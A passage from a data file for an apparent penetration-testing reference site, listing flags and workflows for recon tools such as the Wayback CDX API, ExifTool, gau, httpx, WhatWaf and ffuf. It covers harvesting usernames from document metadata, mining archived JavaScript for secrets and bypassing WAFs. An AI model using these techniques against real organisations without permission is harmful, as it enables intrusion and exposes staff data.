            title: "CDX API Parameters",
            type: "table",
            columns: ["Parameter", "Description"],
            rows: [
              ["url=", "Target URL; supports * wildcards for domain-wide queries"],
              ["output=json|text", "Response format"],
              ["fl=", "Fields to return: original, timestamp, statuscode, mimetype, digest"],
              ["collapse=urlkey", "Deduplicate repeated URLs — almost always what you want"],
              ["from= / to=", "Date range as YYYYMMDD"],
              ["filter=statuscode:200", "Only successfully archived responses"],
              ["filter=mimetype:application/json", "Restrict by content type"],
              ["limit=", "Cap the number of results (negative values return the most recent)"],
              ["matchType=domain|prefix|host", "How broadly to interpret the url parameter"]
            ]
          },
          {
            title: "Companion Tools",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["waybackurls", "Fetches every archived URL for a domain in one command"],
              ["gau (getallurls)", "Same idea, but also queries Common Crawl, URLScan, and OTX"],
              ["waymore", "More thorough — retrieves the archived response bodies, not just URLs"],
              ["gauplus / hakrawler", "Combine archive URLs with live crawling"],
              ["unfurl", "Splits collected URLs into paths, parameters, and domains for analysis"],
              ["httpx", "Checks which of the historical URLs still resolve today"]
            ]
          },
          {
            title: "What to Look For",
            type: "table",
            columns: ["Target", "Why it matters"],
            rows: [
              ["Old API endpoints", "Frequently still live and unpatched after being removed from the UI"],
              ["Query parameters", "Historical parameters reveal input surface for testing on the current app"],
              ["JavaScript files", "Archived JS often contains endpoints, keys, and comments since stripped"],
              ["Removed pages", "Staff directories, org charts, and press releases taken down for a reason"],
              ["Old robots.txt", "Historic Disallow entries name paths the organisation wanted hidden"],
              ["Technology changes", "Compare snapshots to date a platform migration or a rebrand"],
              ["Deleted email addresses", "Contact pages archived before an address was removed"]
            ]
          },
          {
            title: "Related Archives",
            type: "table",
            columns: ["Source", "Notes"],
            rows: [
              ["Common Crawl", "Bulk web crawl data, queryable via its own index API"],
              ["archive.today", "Independent archive; captures pages the Wayback Machine misses or excludes"],
              ["URLScan.io", "Scans submitted by users, with full request/response detail"],
              ["Google cache", "Only the most recent copy, and increasingly deprecated"],
              ["Timetravel / Memento", "Aggregator that queries many archives at once"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Extract and triage historical endpoints", cmd: "waybackurls example.com | sort -u > wayback_urls.txt\nwc -l wayback_urls.txt\n# find parameterised endpoints:\ngrep '?' wayback_urls.txt | unfurl keys | sort | uniq -c | sort -rn" },
              { label: "Check which old URLs are still live", cmd: "cat wayback_urls.txt | httpx -silent -status-code -mc 200,301,302,401,403 \\\n  | tee still_live.txt" },
              { label: "Mine archived JavaScript", cmd: "waybackurls example.com | grep '\\.js$' | sort -u > js_urls.txt\n# fetch the archived copies and grep for endpoints and secrets\nwhile read u; do curl -s \"https://web.archive.org/web/2020/$u\"; done < js_urls.txt \\\n  | grep -oE '\"/[a-zA-Z0-9_/-]+\"' | sort -u" },
              { label: "Read historical robots.txt", cmd: "curl -s 'http://web.archive.org/cdx/search/cdx?url=example.com/robots.txt&output=text&fl=timestamp&collapse=digest'\n# fetch each distinct version and diff the Disallow entries" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Fetching from the archive is passive — you are querying archive.org, not the target. Testing what you find against the live site is not.",
              "A URL existing in the archive says nothing about whether it works today. Always verify with httpx before treating it as a finding.",
              "Archived JavaScript is consistently the richest source here; developers strip secrets from current builds and forget the old ones are preserved.",
              "The CDX API is rate-limited. For large domains use waybackurls or gau, which handle paging and backoff for you.",
              "gau covers more archives than waybackurls alone. On a thorough engagement, run both and merge."
            ]
          }
        ]
      },
      {
        id: "exiftool",
        name: "ExifTool",
        url: "https://exiftool.org/",
        description: "Reads and strips metadata from images, documents, and media files.",
        brief: "ExifTool reads, writes, and removes metadata across essentially every file format that carries it. In OSINT the read direction matters most: photographs carry GPS coordinates, camera serial numbers, and timestamps, while Office documents and PDFs carry author names, internal usernames, software versions, and sometimes internal file paths.\n\nA batch of documents downloaded from a target's website will frequently name their staff, their internal AD usernames, and the software they run — before you have touched a single system.",
        quickReference: [
          { label: "All metadata from a file", cmd: "exiftool image.jpg" },
          { label: "GPS coordinates only", cmd: "exiftool -gps:all -c \"%.6f degrees\" image.jpg" },
          { label: "Author fields across a folder", cmd: "exiftool -r -Author -Creator -LastModifiedBy ./docs/" },
          { label: "Strip all metadata", cmd: "exiftool -all= -overwrite_original file.jpg" },
          { label: "Tabular output across many files", cmd: "exiftool -T -filename -author -createdate -r ./docs/" }
        ],
        sections: [
          {
            title: "Reading Metadata",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["exiftool <file>", "Print every readable tag"],
              ["exiftool -r <dir>", "Recurse through a directory"],
              ["exiftool -<TAG> <file>", "Print one specific tag"],
              ["exiftool -a -u -g1 <file>", "Show duplicate and unknown tags, grouped by family"],
              ["exiftool -T -filename -tag1 -tag2 <files>", "Tab-delimited output, ideal for piping into a spreadsheet"],
              ["exiftool -json <file>", "Structured JSON output"],
              ["exiftool -csv -r <dir> > meta.csv", "CSV across a whole tree — the standard bulk-analysis move"],
              ["exiftool -ee <file>", "Extract embedded data from within the file"]
            ]
          },
          {
            title: "High-Value Tags",
            type: "table",
            columns: ["Tag", "What it reveals"],
            rows: [
              ["GPSLatitude / GPSLongitude", "Exact capture location — home, office, or travel pattern"],
              ["Author / Creator / LastModifiedBy", "Real names and often internal usernames"],
              ["Company / Manager", "Organisational detail embedded by Office"],
              ["Software / Producer / Creator Tool", "Exact application and version, i.e. a patch-level fingerprint"],
              ["CreateDate / ModifyDate", "Timeline reconstruction; timezone offsets hint at location"],
              ["Make / Model / SerialNumber", "Camera identity — a serial number links photos across accounts"],
              ["Title / Subject / Keywords", "Internal classification and project names"],
              ["Comment / XPComment", "Free text authors forget is stored"]
            ]
          },
          {
            title: "Document Metadata",
            type: "table",
            columns: ["Format", "What is typically embedded"],
            rows: [
              ["DOCX / XLSX / PPTX", "Author, last modified by, company, total edit time, revision count, template path"],
              ["PDF", "Producer and creator applications, author, sometimes the source document's full path"],
              ["Legacy DOC / XLS", "Richer still — often includes prior authors and printer names"],
              ["Images in documents", "Embedded photos keep their own EXIF, including GPS"],
              ["Tracked changes / comments", "Not ExifTool's job — check the raw XML, but the metadata points you there"],
              ["Internal paths", "\\\\fileserver\\dept\\ paths in template fields name internal hosts and share names"]
            ]
          },
          {
            title: "Writing & Stripping",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["exiftool -all= <file>", "Remove all metadata (writes a _original backup)"],
              ["exiftool -all= -overwrite_original <file>", "Strip without keeping a backup copy"],
              ["exiftool -gps:all= <file>", "Remove only location data"],
              ["exiftool -<TAG>=\"value\" <file>", "Set a specific tag"],
              ["exiftool -tagsfromfile src.jpg dst.jpg", "Copy metadata between files"],
              ["exiftool -r -all= -ext jpg <dir>", "Bulk-strip one file type across a tree"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Harvest usernames from published documents", cmd: "# collect the documents first\ngoogle: site:example.com filetype:pdf OR filetype:docx\nwget -i doc_urls.txt -P ./docs\n\nexiftool -r -T -filename -Author -Creator -LastModifiedBy -Company ./docs/ \\\n  | tee doc_metadata.tsv\n# unique author values are candidate usernames for AD or email enumeration" },
              { label: "Extract geolocation from an image set", cmd: "exiftool -r -filename -gpslatitude -gpslongitude -createdate \\\n  -c \"%.6f\" -T ./images/ | grep -v '^-'\n# plot the coordinates to see a movement pattern" },
              { label: "Fingerprint the software estate", cmd: "exiftool -r -T -filename -Software -Producer -CreatorTool ./docs/ \\\n  | sort -k2 | uniq -c -f1\n# version strings map directly to patch levels" },
              { label: "Clean your own files before publishing", cmd: "exiftool -r -all= -overwrite_original ./report_assets/\nexiftool -r ./report_assets/ | grep -iE 'author|gps|software'   # verify" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Document metadata is the most reliable way to learn an organisation's internal username format without touching their systems.",
              "Most social platforms strip EXIF on upload, so photos from Instagram or Facebook rarely carry GPS. Files from a company website usually do.",
              "-csv across a directory turns a folder of PDFs into a sortable table of authors and software versions in one command.",
              "Metadata is trivially forged. Treat it as corroborating evidence, not proof.",
              "Run the strip commands on your own deliverables before sending them — reports leak their author's details exactly the same way."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Web Application",
    tools: [
      {
        "id": "httpx",
        "name": "httpx",
        "url": "https://github.com/projectdiscovery/httpx",
        "description": "Fast, multi-purpose HTTP toolkit for probing hosts at scale.",
        "brief": "httpx (ProjectDiscovery) takes a list of hosts or subdomains and quickly reports which are alive, with status code, title, technologies, CNAME, and more. It is the standard 'is it live?' stage that sits between subdomain enumeration and active testing.",
        "quickReference": [
          {
            "label": "Probe a subdomain list",
            "cmd": "httpx -l subs.txt -silent"
          },
          {
            "label": "Rich output for triage",
            "cmd": "httpx -l subs.txt -title -sc -tech-detect -cname"
          },
          {
            "label": "Pipe straight from subfinder",
            "cmd": "subfinder -d target.com -silent | httpx -silent"
          }
        ],
        "sections": [
          {
            "title": "Useful flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-u <t> / -l <file>",
                "Single target / list of hosts (also reads stdin)"
              ],
              [
                "-sc / -title / -td",
                "Status code, page title, technology detection"
              ],
              [
                "-server / -cl / -location",
                "Server header, content-length, redirect Location"
              ],
              [
                "-ip / -cname / -cdn",
                "Resolved IP, CNAME (subdomain-takeover hints), CDN detection"
              ],
              [
                "-favicon / -jarm / -hash <algo>",
                "favicon mmh3 hash, JARM TLS fingerprint, response-body hash"
              ],
              [
                "-mc / -fc <codes>",
                "Match / filter by HTTP status code"
              ],
              [
                "-ms / -fs <str>",
                "Match / filter by a string in the response"
              ],
              [
                "-path <p> / -ports <list>",
                "Probe specific path(s) / additional ports"
              ],
              [
                "-fr / -H <hdr>",
                "Follow redirects / send a custom header"
              ],
              [
                "-t <n> / -rl <n>",
                "Concurrency (threads) / rate limit (requests per second)"
              ],
              [
                "-json / -o <file> / -silent",
                "JSON output / write to file / results only (clean piping)"
              ],
              [
                "-sr",
                "Store the full responses to disk (evidence)"
              ]
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Probe a subdomain list",
                "cmd": "subfinder -d target.com -silent | httpx -silent -sc -title -td"
              },
              {
                "label": "Live hosts + takeover hints",
                "cmd": "httpx -l subs.txt -sc -cname -ip -silent"
              },
              {
                "label": "Keep only interesting responses",
                "cmd": "httpx -l hosts.txt -mc 200,301,302,401,403 -title -silent"
              },
              {
                "label": "Fingerprint / favicon + JARM to JSON",
                "cmd": "httpx -l hosts.txt -favicon -jarm -td -json -o probe.json"
              },
              {
                "label": "Feed a crawler",
                "cmd": "httpx -l subs.txt -silent | katana -silent     # or | gau"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Two different tools are called \"httpx\": this is ProjectDiscovery's HTTP probing toolkit (a Go binary), not the Python httpx HTTP client library.",
              "-silent gives clean, pipeable output — the usual bridge from subfinder to a crawler (katana / gau) or nuclei.",
              "Respect the target: cap throughput with -rl on production, and use -sr to keep full responses as evidence."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "httpx — GitHub (ProjectDiscovery)",
                "url": "https://github.com/projectdiscovery/httpx"
              },
              {
                "label": "Map — Web Pentest Checklist",
                "url": "web-map.html"
              }
            ]
          }
        ]
      },
      {
        "id": "wafw00f",
        "name": "wafw00f",
        "url": "https://github.com/EnableSecurity/wafw00f",
        "description": "Identify and fingerprint the WAF protecting a website.",
        "brief": "wafw00f sends a series of normal and deliberately malicious requests and analyses the responses — status codes, headers, cookies, block pages — to identify which Web Application Firewall (if any) sits in front of a site. Knowing the WAF and its vendor tells you what is likely to block your payloads and how to shape or encode them to slip through.",
        "quickReference": [
          {
            "label": "Fingerprint a site",
            "cmd": "wafw00f https://target.com"
          },
          {
            "label": "List detectable WAFs",
            "cmd": "wafw00f -l"
          },
          {
            "label": "From a URL list",
            "cmd": "wafw00f -i urls.txt"
          },
          {
            "label": "Find every matching WAF, verbose",
            "cmd": "wafw00f https://target.com -a -v"
          }
        ],
        "sections": [
          {
            "title": "Options",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-l",
                "List all WAFs wafw00f can detect"
              ],
              [
                "-a",
                "Find ALL matching WAFs, not just the first"
              ],
              [
                "-i <file>",
                "Read targets from a file (one per line)"
              ],
              [
                "-p <proxy>",
                "Send traffic through an HTTP(S)/SOCKS proxy"
              ],
              [
                "-o <file>",
                "Write results to a file"
              ],
              [
                "-f <json|csv|text>",
                "Output format"
              ],
              [
                "-v",
                "Verbose output (show the reasoning)"
              ],
              [
                "-H <file>",
                "Use custom headers from a file"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Run it early in recon — the identified WAF guides every later payload (encoding, casing, parameter pollution, etc.).",
              "Use -a: some stacks sit behind more than one layer (e.g. a CDN WAF plus an app WAF) and only -a reveals both.",
              "A 'no WAF detected' result is not a guarantee — a silent or custom WAF may still be present; confirm by behaviour when payloads are dropped.",
              "Route through Burp with -p to log exactly what each probe sent and received."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Fingerprint the WAF",
                "cmd": "wafw00f https://target.com"
              },
              {
                "label": "Find every matching product (don't stop at the first)",
                "cmd": "wafw00f -a -v https://target.com"
              },
              {
                "label": "From a list, machine-readable output",
                "cmd": "wafw00f -i urls.txt -o waf.json -f json"
              },
              {
                "label": "Through an intercepting proxy",
                "cmd": "wafw00f https://target.com -p http://127.0.0.1:8080"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "wafw00f — GitHub",
                "url": "https://github.com/EnableSecurity/wafw00f"
              }
            ]
          }
        ]
      },
      {
        "id": "whatwaf",
        "name": "WhatWaf",
        "url": "https://github.com/Ekultek/WhatWaf",
        "description": "Detect WAFs/IPS and suggest tamper-based bypasses.",
        "brief": "WhatWaf detects firewalls and intrusion-protection systems and, unlike wafw00f, also proposes tamper techniques that may bypass the detected protection — making it useful the moment a WAF starts blocking your test payloads. It can read a list of targets, route through a proxy, and suggest the encodings/mutations most likely to evade the identified product.",
        "quickReference": [
          {
            "label": "Detect on a URL",
            "cmd": "whatwaf -u https://target.com"
          },
          {
            "label": "With a random user-agent",
            "cmd": "whatwaf -u https://target.com --ra"
          },
          {
            "label": "Scan a list of URLs",
            "cmd": "whatwaf -l urls.txt"
          },
          {
            "label": "Through a proxy",
            "cmd": "whatwaf -u https://target.com --proxy http://127.0.0.1:8080"
          }
        ],
        "sections": [
          {
            "title": "Options",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-u <url>",
                "Single target URL"
              ],
              [
                "-l <file>",
                "File of URLs to test"
              ],
              [
                "--ra",
                "Use a random user-agent per request"
              ],
              [
                "--proxy <url>",
                "Route traffic through a proxy (e.g. Burp)"
              ],
              [
                "-p <payloads>",
                "Use custom payloads to trigger the WAF"
              ],
              [
                "--throttle <sec>",
                "Delay between requests to avoid rate limits"
              ],
              [
                "-F",
                "Force testing even if no WAF is detected"
              ],
              [
                "--tamper / --encode",
                "Show/apply tamper and encoding suggestions"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Reach for WhatWaf over wafw00f when you specifically want bypass guidance rather than just identification.",
              "Its tamper suggestions are a starting point — confirm each one manually against the live WAF, as detection is heuristic.",
              "Throttle and randomise the user-agent on sensitive targets so the fingerprinting probes do not themselves trip rate limiting."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Detect + suggest tamper bypasses",
                "cmd": "whatwaf -u https://target.com"
              },
              {
                "label": "Evade basic blocking with a random UA",
                "cmd": "whatwaf -u https://target.com --ra"
              },
              {
                "label": "Scan a list of URLs",
                "cmd": "whatwaf -l urls.txt"
              },
              {
                "label": "Route through Burp",
                "cmd": "whatwaf -u https://target.com --proxy http://127.0.0.1:8080"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "WhatWaf — GitHub",
                "url": "https://github.com/Ekultek/WhatWaf"
              }
            ]
          }
        ]
      },
      {
        "id": "gau",
        "name": "gau (getallurls)",
        "url": "https://github.com/lc/gau",
        "description": "Fetch known URLs for a domain from Wayback, Common Crawl, OTX, and URLScan.",
        "brief": "gau pulls every URL that public archives already know about for a domain — old endpoints, parameters, and files that may still work but are no longer linked anywhere. It is the fastest way to build a large URL corpus for parameter and pattern analysis (feed it into gf, qsreplace, and your fuzzers), and it complements an active crawler like gospider or katana.",
        "quickReference": [
          {
            "label": "All URLs for a domain",
            "cmd": "gau target.com"
          },
          {
            "label": "Include subdomains",
            "cmd": "gau --subs target.com"
          },
          {
            "label": "From a domain list",
            "cmd": "cat domains.txt | gau --threads 5 | tee urls.txt"
          },
          {
            "label": "Drop static assets",
            "cmd": "gau --subs --blacklist png,jpg,gif,svg,woff,ttf,css target.com"
          }
        ],
        "sections": [
          {
            "title": "Flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "--subs",
                "Include subdomains of the target"
              ],
              [
                "--providers <list>",
                "Sources to query: wayback,commoncrawl,otx,urlscan"
              ],
              [
                "--threads <n>",
                "Number of worker threads"
              ],
              [
                "--blacklist <exts>",
                "Comma-separated extensions to skip (png,jpg,css,...)"
              ],
              [
                "--from / --to <YYYYMM>",
                "Restrict results to a date range"
              ],
              [
                "--o <file>",
                "Write results to a file"
              ],
              [
                "--json",
                "Output as JSON (with source/date metadata)"
              ],
              [
                "--fc <codes> / --mc <codes>",
                "Filter/match by HTTP status (when known)"
              ],
              [
                "--config <file>",
                "Alternate TOML config (API keys for providers)"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Archive data is historical, so expect dead URLs — pipe the output through httpx to keep only live ones before testing.",
              "Blacklist static extensions to cut the list down to endpoints that actually take parameters.",
              "gau pairs naturally with gf: gau --subs target.com | gf ssrf  (or xss/lfi/sqli) to surface likely-vulnerable parameters.",
              "Add URLScan/OTX API keys in the config to widen coverage; sort -u the merged output of gau, katana, and gospider."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "All historical URLs (incl. subdomains)",
                "cmd": "gau --subs target.com"
              },
              {
                "label": "From a domain list, drop static assets",
                "cmd": "cat domains.txt | gau --blacklist png,jpg,css,woff,svg --threads 5"
              },
              {
                "label": "Parameterised URLs for fuzzing",
                "cmd": "gau target.com | grep \"=\" | qsreplace FUZZ | sort -u"
              },
              {
                "label": "Live-check the recovered endpoints",
                "cmd": "gau target.com | httpx -silent -mc 200"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "gau — GitHub",
                "url": "https://github.com/lc/gau"
              }
            ]
          }
        ]
      },
      {
        "id": "gospider",
        "name": "gospider",
        "url": "https://github.com/jaeles-project/gospider",
        "description": "Fast web spider that crawls a site and extracts links, JS, and forms.",
        "brief": "gospider actively crawls a target in Go, following links and pulling out URLs, JavaScript files, forms, subdomains, and third-party sources (robots.txt, sitemap, and optionally Wayback/OTX/Common Crawl). Where gau reads archives, gospider walks the live site, so running both and merging the results gives the widest view of the attack surface.",
        "quickReference": [
          {
            "label": "Crawl one site",
            "cmd": "gospider -s https://target.com -d 2 -c 10"
          },
          {
            "label": "Crawl a list with extra sources",
            "cmd": "gospider -S urls.txt -c 10 -d 1 --other-source"
          },
          {
            "label": "Include subdomains, send to Burp",
            "cmd": "gospider -s https://target.com --include-subs -p http://127.0.0.1:8080"
          }
        ],
        "sections": [
          {
            "title": "Flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-s <url>",
                "Single site to crawl"
              ],
              [
                "-S <file>",
                "File of sites to crawl"
              ],
              [
                "-d <n>",
                "Maximum crawl depth (0 = unlimited)"
              ],
              [
                "-c <n>",
                "Concurrent requests per domain"
              ],
              [
                "-t <n>",
                "Number of threads (parallel sites)"
              ],
              [
                "--other-source",
                "Also pull URLs from Wayback, OTX, and Common Crawl"
              ],
              [
                "--include-subs",
                "Include subdomains encountered while crawling"
              ],
              [
                "-a",
                "Find URLs from third-party sources (archives) as well"
              ],
              [
                "-p <proxy>",
                "Route through a proxy (e.g. Burp)"
              ],
              [
                "--blacklist <regex>",
                "Skip URLs matching the pattern (e.g. static assets)"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Keep depth modest (1-2) on large sites or the crawl explodes; raise concurrency (-c) for speed instead.",
              "--other-source turns gospider into a one-stop collector (live crawl + archives), but gau is faster for archive-only passes.",
              "Proxy through Burp (-p) to populate the sitemap and capture interesting requests as it crawls.",
              "Pipe the discovered JS into subjs/xnLinkFinder for deeper endpoint extraction."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Crawl one site (depth 2)",
                "cmd": "gospider -s https://target.com -d 2 -c 10 -o out/"
              },
              {
                "label": "Crawl a list + pull archive sources",
                "cmd": "gospider -S urls.txt -c 10 -d 1 --other-source"
              },
              {
                "label": "Include subdomains, route through Burp",
                "cmd": "gospider -s https://target.com --include-subs -p http://127.0.0.1:8080"
              },
              {
                "label": "Extract just the JS files",
                "cmd": "gospider -s https://target.com -d 3 | grep -Eo \"https?://\\S+\\.js\" | sort -u"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "gospider — GitHub",
                "url": "https://github.com/jaeles-project/gospider"
              }
            ]
          }
        ]
      },
      {
        "id": "subjs",
        "name": "subjs",
        "url": "https://github.com/lc/subjs",
        "description": "Extract JavaScript file URLs from a list of hosts.",
        "brief": "subjs takes URLs or live hosts and returns the JavaScript file URLs they reference. Those JS files are the raw material for endpoint and secret discovery, so subjs is the collection step that comes before analysis with xnLinkFinder, JSA, or a secret scanner.",
        "quickReference": [
          {
            "label": "From a URL list",
            "cmd": "cat urls.txt | subjs"
          },
          {
            "label": "Chain from httpx",
            "cmd": "cat hosts.txt | httpx -silent | subjs | tee js_files.txt"
          },
          {
            "label": "From a file, more workers",
            "cmd": "subjs -i urls.txt -c 40"
          }
        ],
        "sections": [
          {
            "title": "Options",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-i <file>",
                "Input file of URLs/hosts (otherwise reads stdin)"
              ],
              [
                "-c <n>",
                "Concurrency (number of workers)"
              ],
              [
                "-t <sec>",
                "Request timeout"
              ],
              [
                "-ua <string>",
                "Custom user-agent"
              ]
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "subjs only lists the JS URLs — download and analyse them separately (xnLinkFinder, JSA) to extract endpoints and secrets.",
              "Feed it live hosts (httpx output) rather than raw domains so it only fetches pages that respond.",
              "Pipe the collected files through a secrets scanner (trufflehog/gitleaks on downloaded copies) to catch hardcoded keys."
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "JS URLs from a list",
                "cmd": "cat urls.txt | subjs"
              },
              {
                "label": "Chain from live hosts",
                "cmd": "cat hosts.txt | httpx -silent | subjs | tee js_files.txt"
              },
              {
                "label": "More workers from a file",
                "cmd": "subjs -i urls.txt -c 40"
              },
              {
                "label": "Hunt secrets/endpoints in the JS",
                "cmd": "subjs -i urls.txt | nuclei -t http/exposures/     # or feed to a secrets scanner"
              }
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "subjs — GitHub",
                "url": "https://github.com/lc/subjs"
              }
            ]
          }
        ]
      },
      {
        id: "ffuf",
        name: "FFUF",
        url: "https://github.com/ffuf/ffuf",
        description: "Fast web fuzzer for directories, virtual hosts, and parameters.",
        brief: "ffuf (Fuzz Faster U Fool) is a fast, flexible, Go-based fuzzer — the go-to for directory/file discovery, virtual host discovery, and parameter fuzzing against a web target, all using the same FUZZ-keyword syntax.",
        quickReference: [
          { label: "Directory/file discovery", cmd: "ffuf -w wordlist.txt -u https://target.com/FUZZ" },
          { label: "Virtual host discovery", cmd: "ffuf -w subdomains.txt -u https://target.com -H \"Host: FUZZ.target.com\"" },
          { label: "Parameter fuzzing", cmd: "ffuf -w wordlist.txt -u \"https://target.com/?FUZZ=test\"" },
          { label: "Cut a repeated false-positive response", cmd: "ffuf -w wordlist.txt -u https://target.com/FUZZ -fs <size>" }
        ],
        sections: [
          {
            title: "Directory Discovery",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-u https://target.com/FUZZ", "Base directory/file discovery"],
              ["-e .php,.txt,.bak", "Append extensions to each wordlist entry"],
              ["-t 100", "Set thread count (default 40) — raise carefully, watch for rate limiting"],
              ["-recursion", "Automatically re-fuzz inside directories that return a hit (see Recursive Fuzzing)"]
            ]
          },
          {
            title: "Virtual Hosts",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-u https://target.com -H \"Host: FUZZ.target.com\"", "Fuzz the Host header to find virtual hosts sharing one IP"],
              ["Baseline comparison", "Check the response for an obviously-wrong hostname first — a wildcard/default vhost often returns the same response for everything, so real hits are the ones that differ"]
            ]
          },
          {
            title: "Parameters",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-u \"https://target.com/?FUZZ=test\"", "Fuzz GET parameter names"],
              ["-u \"https://target.com/?id=FUZZ\"", "Fuzz a known parameter's value"],
              ["-X POST -d \"user=FUZZ&pass=test\"", "Fuzz inside a POST body"]
            ]
          },
          {
            title: "Recursive Fuzzing",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-recursion", "Automatically fuzz inside any directory that returns a hit"],
              ["-recursion-depth <n>", "Cap how many levels deep recursion goes"],
              ["Caution", "Scan time grows fast with recursion on a large wordlist — start shallow"]
            ]
          },
          {
            title: "Filters",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-fc <codes>", "Filter OUT specific response status codes"],
              ["-fs <size>", "Filter OUT responses of a specific size (the classic \"kill the false-positive 404 page\" flag)"],
              ["-fw <count>", "Filter OUT responses with a specific word count"],
              ["-fl <count>", "Filter OUT responses with a specific line count"]
            ]
          },
          {
            title: "Matchers",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-mc <codes>", "Match ONLY specific status codes (default: 200-299,301,302,307,401,403,405)"],
              ["-ms <size>", "Match ONLY a specific response size"],
              ["-mr <regex>", "Match ONLY responses whose body matches a regex"]
            ]
          },
          {
            title: "Auto Calibration",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-ac", "Auto-detect and filter likely false-positive responses (wildcard/catch-all pages) instead of manually figuring out -fs/-fc"]
            ]
          },
          {
            title: "Wordlist Usage",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-w wordlist.txt", "Single wordlist, keyword defaults to FUZZ"],
              ["-w list1.txt:FUZZ1 -w list2.txt:FUZZ2", "Multiple wordlists with distinct keywords, e.g. for combined vhost + path fuzzing"],
              ["SecLists cross-reference", "Discovery/Web-Content/ and Discovery/DNS/ from SecLists are the usual default wordlist source"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Initial directory sweep", cmd: "ffuf -w common.txt -u https://target.com/FUZZ\n# note the baseline 404 size, then:\nffuf -w common.txt -u https://target.com/FUZZ -fs <baseline_size>\n# once a stack is confirmed, re-run with matching extensions:\nffuf -w common.txt -u https://target.com/FUZZ -e .php,.bak" },
              { label: "Recursive enumeration", cmd: "ffuf -w common.txt -u https://target.com/FUZZ -recursion -recursion-depth 2" },
              { label: "Parameter discovery on a found endpoint", cmd: "ffuf -w params.txt -u \"https://target.com/page?FUZZ=test\"\n# once a real param is found:\nffuf -w values.txt -u \"https://target.com/page?found_param=FUZZ\"" },
              { label: "GET & POST parameter-value fuzzing (worked example)", cmd: "# GET: fuzz a parameter's VALUE to find one the server accepts\nffuf -u \"http://target.com/get.php?x=FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v\n# a hit (e.g. x=OA_HTML) returns a different size/response -> confirm it:\ncurl \"http://target.com/get.php?x=OA_HTML\"\n\n# POST: fuzz a body parameter's VALUE (set the Content-Type, match 200 with -mc 200)\nffuf -u http://target.com/post.php -X POST \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"y=FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v\n# confirm the accepted value:\ncurl -d \"y=SUNWmc\" http://target.com/post.php" },
              { label: "Virtual-host discovery (Host-header fuzzing)", cmd: "# one IP can serve many sites; fuzz the Host header to find the others\nffuf -u http://target.htb:8080/ \\\n  -H \"Host: FUZZ.target.htb\" \\\n  -w /usr/share/seclists/Discovery/Web-Content/common.txt\n# every vhost usually returns the same default page, so filter the baseline\n# size out (-fs <size>) or auto-calibrate (-ac) to leave only the real hits" },
              { label: "DNS subdomain brute force", cmd: "# fuzz the hostname itself against a subdomain wordlist (-v shows the resolved URL)\nffuf -u http://FUZZ.target.com/ \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n  -v\n# unlike vhost fuzzing this needs the names to actually resolve in DNS;\n# add -fs/-fc to drop the wildcard-DNS catch-all response" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Add -p <seconds> to throttle requests if you start tripping a WAF or getting blocked mid-scan.",
              "Always check what a 'normal' 404/catch-all response looks like before trusting -mc or -fc results blindly.",
              "Save output with -o results.json -of json so you can diff results between runs later.",
              "-ac is a good default starting point on unfamiliar targets; drop to manual -fs/-fc once you understand the baseline."
            ]
          }
        ]
      },
      {
        id: "burpsuite",
